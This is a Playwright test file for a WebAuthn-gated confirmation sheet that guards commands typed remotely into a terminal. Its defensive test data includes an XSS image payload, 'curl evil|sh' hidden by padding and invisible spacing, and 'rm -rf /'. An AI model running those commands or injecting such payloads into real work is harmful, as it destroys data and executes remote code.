"""The unlock sheet and the platform credential (R11, docs/bridge-protocol.md section 9) in a real browser.

Chromium's virtual authenticator (CDP WebAuthn domain: platform, resident key, user verification on) plays the
phone's Face ID. The host is tests/support/fake_bridge_host.py: it registers the credential at pairing, parks a request
that needs an assertion, verifies the assertion with the Python reference (bridge_protocol_ref.verify_assertion) and
only then runs the request. WebAuthn needs a real host name as its RP id, so the browser uses localhost, not 127.0.0.1."""
import base64

import pytest
from playwright.sync_api import expect

from tests.support.fake_bridge_host import FakeHost

from .conftest import make_desktop, login_ui
from .test_remote import HTML, dash, frame_of, wait_h1

pytestmark = pytest.mark.browser

FORM = '<form method="post" action="{}"><button id="{}">Go</button></form>'
SUBJECT = {"kind": "action", "shown": "Type into terminal 2: ls -la", "digest": "ab" * 32, "scope": "type"}


def page_with(title, *forms, extra=""):
    body = "".join(FORM.format(p, i) for p, i in forms)
    return {"status": 200, "headers": HTML, "page": True,
            "body": f'<!doctype html><html><head><meta charset="utf-8"><title>{title}</title></head><body><h1>{title}</h1>{body}{extra}</body></html>'}


@pytest.fixture(autouse=True)
def _chromium_only(browser_name):
    if browser_name not in (None, "chromium"):
        pytest.skip("the virtual authenticator is Chromium's (CDP)")


@pytest.fixture
def live_server(tmp_path, monkeypatch):
    """The usual server, but known to itself and to the tests as http://localhost:PORT: WebAuthn refuses an IP address as
    its RP id, and the server checks Origin against its public URL."""
    import dataclasses

    from tests import conftest as root
    port = root._free_port()
    monkeypatch.setattr(root, "_free_port", lambda: port)
    with root.run_live_server(tmp_path, FS_PUBLIC_URL=f"http://localhost:{port}") as srv:
        yield dataclasses.replace(srv, url=f"http://localhost:{port}")


@pytest.fixture
def base(live_server):
    return live_server.url


@pytest.fixture
def authenticator(page):
    cdp = page.context.new_cdp_session(page)
    cdp.send("WebAuthn.enable")
    aid = cdp.send("WebAuthn.addVirtualAuthenticator", {"options": {
        "protocol": "ctap2", "transport": "internal", "hasResidentKey": True, "hasUserVerification": True,
        "isUserVerified": True, "automaticPresenceSimulation": True}})["authenticatorId"]
    cdp.aid = aid
    return cdp


@pytest.fixture
def signed_in(page, base, live_server, sim):
    login_ui(page, base, sim.passphrase, then="/remote")
    page.locator("#ws-loading").wait_for(state="hidden")
    return page


@pytest.fixture
def make_host(live_server, sim, base):
    hosts = []

    def make(pages, requires=None, label="Acme Energy"):
        space, headers = make_desktop(live_server, sim, label=label)
        host = FakeHost(live_server.url, space, headers, sim.mk, pages).start()
        host.origin = base
        host.requires = requires or {}
        hosts.append(host)
        return host
    yield make
    for h in hosts:
        h.stop()


def pair(page, base, host, scope="type", credential=True):
    """Pair through the real page. With credential, press the register button (the person's click)."""
    frag = host.offer(scope)
    page.goto(f"{base}/remote")
    page.goto(f"{base}/remote/pair#{frag}")
    page.locator("#pair-go").click()
    if credential:
        page.locator("#pair-cred").click(timeout=30000)
    page.locator("#pair-fp").wait_for(state="visible", timeout=30000)
    expect(page.locator("#pair-state")).to_contain_text("Waiting for you to approve", timeout=30000)
    dev = next(iter(host.waiting()))
    host.approve(dev)
    expect(page.locator("#remote-pair-main h1")).to_have_text("Paired", timeout=30000)
    return dev


def open_dash(page, base, host, title="Home"):
    page.goto(f"{base}/remote?space={host.space}")
    wait_h1(page, title)


def sheet(page):
    return page.locator("#unlock-sheet")


def confirm(page):
    page.wait_for_timeout(700)                       # the button counts only after its delay
    page.locator("#unlock-go").click()


def seen(host, path):
    return [m for m in host.seen if m.get("path") == path]


HOME = page_with("Home", ("/type", "type"), ("/lease", "lease"),
                 extra='<iframe src="/w/chart" title="Chart"></iframe><a id="dl" href="/f.bin">file</a>')
TYPED = dash("Typed")


@pytest.fixture
def setup(signed_in, base, make_host, authenticator):
    host = make_host({"/": HOME, "/type": TYPED, "/lease": dash("Leased"), "/w/chart": {"status": 200, "headers": HTML, "body": "<p>widget</p>"},
                      "/f.bin": {"status": 200, "headers": {"content-type": "application/octet-stream"}, "body": "x"}},
                     {"/type": dict(SUBJECT), "/lease": {"kind": "lease", "shown": "Type for 15 minutes", "digest": "", "scope": "type", "purpose": "lease"}})
    pair(signed_in, base, host)
    open_dash(signed_in, base, host)
    return signed_in, host, authenticator


def test_pairing_creates_the_platform_credential_and_keeps_only_its_id(signed_in, base, make_host, authenticator):
    host = make_host({"/": HOME})
    dev = pair(signed_in, base, host)
    cred = host.creds[dev]
    assert cred["rp_id"] == "localhost" and cred["origin"] == base
    stored = authenticator.send("WebAuthn.getCredentials", {"authenticatorId": authenticator.aid})["credentials"]
    assert len(stored) == 1
    rec = signed_in.evaluate("""async (ws) => (await (await import("/static/js/bridge-store.js")).workspaceRecord(ws)).credentialId""", host.space)
    assert base64.urlsafe_b64decode(rec + "=" * (-len(rec) % 4)).hex() == cred["credential_id"]
    expect(signed_in.locator("#pair-done-cred")).to_contain_text("Face ID")
    assert signed_in.evaluate("Object.keys(localStorage).concat(Object.keys(sessionStorage))") == []      # nothing kept but the id above


def test_a_browser_with_no_platform_authenticator_pairs_but_is_told_it_cannot_type(signed_in, base, make_host):
    signed_in.add_init_script("window.PublicKeyCredential = window.PublicKeyCredential || function () {};"
                              "PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable = async () => false;")
    host = make_host({"/": HOME})
    dev = pair(signed_in, base, host, credential=False)
    assert host.creds == {}
    expect(signed_in.locator("#pair-done-cred")).to_contain_text("cannot type")
    assert dev in host.state["devices"]


def test_a_type_action_asks_with_a_sheet_then_runs_once(setup):
    page, host, _ = setup
    frame_of(page).locator("#type").click()
    expect(sheet(page)).to_be_visible(timeout=30000)
    expect(page.locator("#unlock-text")).to_have_text(SUBJECT["shown"])
    expect(sheet(page)).to_contain_text("ab" * 4)
    assert seen(host, "/type") == []                  # nothing ran yet
    confirm(page)
    wait_h1(page, "Typed")
    assert len(seen(host, "/type")) == 1 and host.audit == [{"ok": True, "why": None, "rid": host.audit[0]["rid"], "purpose": "fresh"}]
    expect(sheet(page)).to_have_count(0)


def test_a_lease_is_asked_once_and_then_typing_goes_on(setup):
    page, host, _ = setup
    frame_of(page).locator("#lease").click()
    expect(sheet(page)).to_be_visible(timeout=30000)
    expect(page.locator("#unlock-text")).to_have_text("Type for 15 minutes")
    confirm(page)
    wait_h1(page, "Leased")
    assert [a["purpose"] for a in host.audit] == ["lease"]
    page.reload()
    wait_h1(page, "Home")
    frame_of(page).locator("#lease").click()
    wait_h1(page, "Leased")                           # the host's lease is open: no second sheet
    assert sheet(page).count() == 0 and len(host.audit) == 1 and len(seen(host, "/lease")) == 2


def test_cancel_runs_nothing_and_says_so(setup):
    page, host, _ = setup
    frame_of(page).locator("#type").click()
    expect(sheet(page)).to_be_visible(timeout=30000)
    page.locator("#unlock-cancel").click()
    expect(sheet(page)).to_have_count(0)
    expect(page.locator("#remote-notice")).to_contain_text("Not confirmed, so nothing was done")
    assert seen(host, "/type") == [] and host.audit == []


def test_a_failed_user_verification_runs_nothing(setup):
    page, host, cdp = setup
    cdp.send("WebAuthn.setUserVerified", {"authenticatorId": cdp.aid, "isUserVerified": False})
    frame_of(page).locator("#type").click()
    expect(sheet(page)).to_be_visible(timeout=30000)
    confirm(page)
    expect(page.locator("#remote-notice")).to_contain_text("Not confirmed", timeout=30000)
    assert seen(host, "/type") == [] and host.audit == []
    expect(sheet(page)).to_have_count(0)


def test_a_subject_that_looks_like_markup_is_drawn_as_text(signed_in, base, make_host, authenticator):
    hostile = '<img src=x onerror="window.__x=1"> rm -rf'
    host = make_host({"/": HOME, "/type": TYPED}, {"/type": {**SUBJECT, "shown": hostile}})
    pair(signed_in, base, host)
    open_dash(signed_in, base, host)
    frame_of(signed_in).locator("#type").click()
    expect(sheet(signed_in)).to_be_visible(timeout=30000)
    expect(signed_in.locator("#unlock-text")).to_have_text(hostile)
    assert signed_in.locator("#unlock-sheet img").count() == 0 and signed_in.evaluate("window.__x") is None
    confirm(signed_in)
    wait_h1(signed_in, "Typed")                       # the challenge hashed exactly that text


def test_the_sheet_shows_exactly_what_the_host_sent_so_a_swapped_subject_is_refused(setup):
    page, host, _ = setup
    host.lie_subject = "Open the pod bay doors"       # the sheet shows this; the host's challenge covers the real subject
    frame_of(page).locator("#type").click()
    expect(sheet(page)).to_be_visible(timeout=30000)
    expect(page.locator("#unlock-text")).to_have_text("Open the pod bay doors")
    confirm(page)
    expect(page.locator("#remote-notice")).to_contain_text("The confirmation was refused", timeout=30000)
    assert seen(host, "/type") == [] and [a["ok"] for a in host.audit] == [False]       # one try, not a retry loop


def test_the_button_counts_only_a_real_click_after_its_delay(setup):
    page, host, _ = setup
    page.evaluate("""async () => {
      const U = await import("/static/js/unlock.js");
      window.__confirmed = 0;
      U.drawSheet({title: "t", text: "x", facts: [], delayMs: 60000, onConfirm: () => { window.__confirmed++; }, onCancel: () => {}});
      document.getElementById("unlock-go").disabled = false;      // forced open: the delay still holds
      window.__sheet2 = true;
    }""")
    page.locator("#unlock-go").last.click()
    assert page.evaluate("window.__confirmed") == 0
    page.evaluate("""async () => {
      const U = await import("/static/js/unlock.js");
      document.querySelectorAll("#unlock-sheet").forEach((n) => n.remove());
      U.drawSheet({title: "t", text: "x", facts: [], delayMs: 0, onConfirm: () => { window.__confirmed++; }, onCancel: () => {}});
      const b = document.getElementById("unlock-go");
      b.disabled = false;
      b.dispatchEvent(new MouseEvent("click", {bubbles: true}));    // a script's click is not a person's
      b.click();
    }""")
    assert page.evaluate("window.__confirmed") == 0
    page.locator("#unlock-go").click()
    assert page.evaluate("window.__confirmed") == 1


def test_only_one_sheet_is_open_at_a_time(setup):
    page, host, _ = setup
    out = page.evaluate("""async () => {
      const U = await import("/static/js/unlock.js");
      const session = {workspace: "a".repeat(32), deviceIdBytes: new Uint8Array(16), offsetMs: 0, credentialId: "AAAA"};
      const refusal = (n) => ({code: "assertion_required", rid: n.repeat(32), meta: {purpose: "fresh", scope: "type", nonce: "b".repeat(64),
        expires_ms: Date.now() + 60000, subject: {kind: "action", shown: "one", digest: ""}}});
      const first = U.askAssertion(session, refusal("1"));
      await new Promise((r) => setTimeout(r, 100));
      const second = await U.askAssertion(session, refusal("2"));
      const sheets = document.querySelectorAll("#unlock-sheet").length;
      document.getElementById("unlock-cancel").click();
      return {second, sheets, first: await first};
    }""")
    assert out == {"second": {"ok": False, "reason": "busy"}, "sheets": 1, "first": {"ok": False, "reason": "cancelled"}}


def test_an_agent_widget_or_artifact_says_it_is_not_available_remotely(setup):
    page, host, _ = setup
    frame_of(page).locator("a.orch-viewer-link").click()
    expect(page.locator("#remote-notice")).to_contain_text("not available remotely", timeout=30000)


def test_a_frame_cannot_reach_the_sheet_or_ask_for_webauthn(setup):
    page, host, _ = setup
    f = frame_of(page)
    err = f.evaluate("""async () => { try { await navigator.credentials.get({publicKey: {challenge: new Uint8Array(32), userVerification: "required"}}); return "ran"; }
      catch (e) { return e.name; } }""")
    assert err != "ran"
    assert f.evaluate("window.top === window.self") is False


def with_subject(signed_in, base, make_host, shown):
    host = make_host({"/": HOME, "/type": TYPED}, {"/type": {**SUBJECT, "shown": shown, "digest": ""}})
    pair(signed_in, base, host)
    open_dash(signed_in, base, host)
    frame_of(signed_in).locator("#type").click()
    return host


def test_a_subject_padded_with_empty_lines_cannot_hide_its_tail(signed_in, base, make_host, authenticator):
    host = with_subject(signed_in, base, make_host, "git status" + "\n" * 300 + "curl evil|sh")
    expect(sheet(signed_in)).to_be_visible(timeout=30000)
    expect(signed_in.locator("#unlock-text")).to_have_text("git status\n[\u2026 blank lines \u2026]\ncurl evil|sh")
    expect(signed_in.locator("#unlock-tail")).to_contain_text("curl evil|sh")
    expect(sheet(signed_in)).to_contain_text("3 lines")
    assert signed_in.locator("#unlock-tail").bounding_box()["y"] + 5 < signed_in.viewport_size["height"]      # on the page, not scrolled away
    confirm(signed_in)
    wait_h1(signed_in, "Typed")                           # what was hashed is the host's whole text


def test_a_long_text_says_so_and_shows_its_end(signed_in, base, make_host, authenticator):
    text = "\n".join(f"line {i}" for i in range(30)) + "\nrm -rf /"
    with_subject(signed_in, base, make_host, text)
    expect(sheet(signed_in)).to_be_visible(timeout=30000)
    expect(signed_in.locator("#unlock-more")).to_be_visible()                 # the box scrolls: say so
    expect(signed_in.locator("#unlock-tail")).to_contain_text("rm -rf /")
    expect(sheet(signed_in)).to_contain_text("31 lines")


def test_a_short_text_has_no_marker_and_no_tail_line(setup):
    page, host, _ = setup
    frame_of(page).locator("#type").click()
    expect(sheet(page)).to_be_visible(timeout=30000)
    expect(page.locator("#unlock-more")).to_be_hidden()
    assert page.locator("#unlock-tail").count() == 0
    expect(page.locator("#unlock-text")).to_have_text(SUBJECT["shown"])


@pytest.mark.parametrize("shown", ["a" * 2001, "\n".join(f"l{i}" for i in range(41))])
def test_a_text_that_is_too_long_is_refused_and_no_sheet_opens(signed_in, base, make_host, authenticator, shown):
    host = with_subject(signed_in, base, make_host, shown)
    expect(signed_in.locator("#remote-notice")).to_contain_text("too long to check on this phone", timeout=30000)
    assert sheet(signed_in).count() == 0 and seen(host, "/type") == [] and host.audit == []


def test_switching_workspace_closes_an_open_sheet_and_frees_the_next(signed_in, base, make_host, authenticator):
    a = make_host({"/": HOME, "/type": TYPED}, {"/type": dict(SUBJECT)})
    b = make_host({"/": dash("Second home")}, label="Second")
    pair(signed_in, base, a)
    pair(signed_in, base, b)
    open_dash(signed_in, base, a)
    frame_of(signed_in).locator("#type").click()
    expect(sheet(signed_in)).to_be_visible(timeout=30000)
    signed_in.get_by_role("button", name="Open Second").click()
    expect(sheet(signed_in)).to_have_count(0, timeout=30000)
    assert signed_in.evaluate("import('/static/js/unlock.js').then((u) => u.sheetOpen())") is False
    wait_h1(signed_in, "Second home")
    assert seen(a, "/type") == []


def test_no_question_of_the_frame_stacks_on_an_open_sheet(setup):
    page, host, _ = setup
    frame_of(page).locator("#type").click()
    expect(sheet(page)).to_be_visible(timeout=30000)
    frame_of(page).locator("#dl").click()                 # a download is offered as a question; not while the sheet is open
    expect(page.locator("#remote-notice")).to_contain_text("Another question is waiting", timeout=30000)
    assert page.locator(".frame-prompt").count() == 1
    z = page.evaluate("getComputedStyle(document.getElementById('unlock-sheet')).zIndex")
    assert int(z) > 95


def scroll_end(page):
    page.evaluate("() => { const t = document.getElementById('unlock-text'); t.scrollTop = t.scrollHeight; }")


PROBE = "git status " + "\u00a0" * 900 + "curl evil|sh" + "\u00a0" * 900 + " # done"


@pytest.mark.parametrize("filler", ["\u00a0", "\u2800", "\u3000", "\u2003", "\u200b"])
def test_invisible_padding_inside_a_line_is_refused(signed_in, base, make_host, authenticator, filler):
    host = with_subject(signed_in, base, make_host, PROBE.replace("\u00a0", filler))
    expect(signed_in.locator("#remote-notice")).to_contain_text("invisible or look-alike spacing", timeout=30000)
    assert sheet(signed_in).count() == 0 and seen(host, "/type") == [] and host.audit == []


def test_a_run_of_ascii_spaces_is_one_marker_the_host_cannot_type(signed_in, base, make_host, authenticator):
    padded = "git status" + " " * 900 + "curl evil|sh" + " " * 900 + " # done"
    with_subject(signed_in, base, make_host, padded)
    expect(sheet(signed_in)).to_be_visible(timeout=30000)
    marks = signed_in.locator("#unlock-text .unlock-mark")
    assert marks.all_inner_texts() == ["[900 spaces]", "[901 spaces]"]
    assert signed_in.evaluate("getComputedStyle(document.querySelector('#unlock-text .unlock-mark')).backgroundColor") != "rgba(0, 0, 0, 0)"
    expect(signed_in.locator("#unlock-tail .unlock-mark")).to_have_count(1)
    expect(sheet(signed_in)).to_contain_text("1 line, 1829 characters")
    confirm(signed_in)
    wait_h1(signed_in, "Typed")


def test_text_that_looks_like_a_marker_is_plain_text(signed_in, base, make_host, authenticator):
    typed = "[\u2026 blank lines \u2026] [9 spaces]"
    with_subject(signed_in, base, make_host, typed)
    expect(sheet(signed_in)).to_be_visible(timeout=30000)
    expect(signed_in.locator("#unlock-text")).to_have_text(typed)
    assert signed_in.locator("#unlock-sheet .unlock-mark").count() == 0


def test_blank_lines_are_a_marker_element_not_text(signed_in, base, make_host, authenticator):
    with_subject(signed_in, base, make_host, "a\n\n\nb")
    expect(sheet(signed_in)).to_be_visible(timeout=30000)
    assert signed_in.locator('#unlock-text .unlock-mark[data-mark="blanks"]').count() == 1


def test_an_indented_command_still_works(signed_in, base, make_host, authenticator):
    with_subject(signed_in, base, make_host, "if x:\n    run()\n        deeper(1)")
    expect(sheet(signed_in)).to_be_visible(timeout=30000)
    assert signed_in.locator("#unlock-text .unlock-mark").all_inner_texts() == ["[4 spaces]", "[8 spaces]"]
    confirm(signed_in)
    wait_h1(signed_in, "Typed")


def test_confirm_waits_until_the_text_is_scrolled_to_its_end(signed_in, base, make_host, authenticator):
    host = with_subject(signed_in, base, make_host, "\n".join(f"line {i}" for i in range(30)) + "\nrm -rf /")
    expect(sheet(signed_in)).to_be_visible(timeout=30000)
    signed_in.wait_for_timeout(800)
    expect(signed_in.locator("#unlock-go")).to_be_disabled()
    expect(signed_in.locator("#unlock-more")).to_contain_text("Scroll to the end to confirm")
    signed_in.evaluate("document.getElementById('unlock-go').disabled = false")          # forced open: the click still checks
    signed_in.locator("#unlock-go").click()
    signed_in.wait_for_timeout(500)
    assert host.audit == [] and sheet(signed_in).count() == 1
    scroll_end(signed_in)
    expect(signed_in.locator("#unlock-go")).to_be_enabled()
    expect(signed_in.locator("#unlock-more")).to_be_hidden()
    signed_in.locator("#unlock-go").click()
    wait_h1(signed_in, "Typed")


@pytest.mark.parametrize("shown", ["a" * 2000, "\n".join(f"l{i}" for i in range(40))])
def test_a_text_exactly_at_the_limits_opens_and_can_be_confirmed(signed_in, base, make_host, authenticator, shown):
    with_subject(signed_in, base, make_host, shown)
    expect(sheet(signed_in)).to_be_visible(timeout=30000)
    scroll_end(signed_in)
    signed_in.wait_for_timeout(700)
    expect(signed_in.locator("#unlock-go")).to_be_enabled()
    signed_in.locator("#unlock-go").click()
    wait_h1(signed_in, "Typed")


def test_a_registration_click_after_the_window_asks_for_a_second_click(signed_in, base, make_host, authenticator):
    signed_in.add_init_script("window.__skew = 0; const n = Date.now.bind(Date); Date.now = () => n() + window.__skew;")
    host = make_host({"/": HOME})
    frag = host.offer("type")
    signed_in.goto(f"{base}/remote")
    signed_in.goto(f"{base}/remote/pair#{frag}")
    signed_in.locator("#pair-go").click()
    signed_in.locator("#pair-cred").wait_for(timeout=30000)
    signed_in.evaluate("window.__skew = 130000")                 # the person took more than the host's 120 s
    signed_in.locator("#pair-cred").click()
    expect(signed_in.locator("#pair-cred")).to_have_text("Try again: register this browser", timeout=30000)
    expect(signed_in.locator("#pair-cred-note")).to_contain_text("took too long")
    signed_in.evaluate("window.__skew = 0")
    assert authenticator.send("WebAuthn.getCredentials", {"authenticatorId": authenticator.aid})["credentials"] == []
    signed_in.locator("#pair-cred").click()
    expect(signed_in.locator("#pair-state")).to_contain_text("Waiting for you to approve", timeout=30000)
    assert len(host.creds) == 1
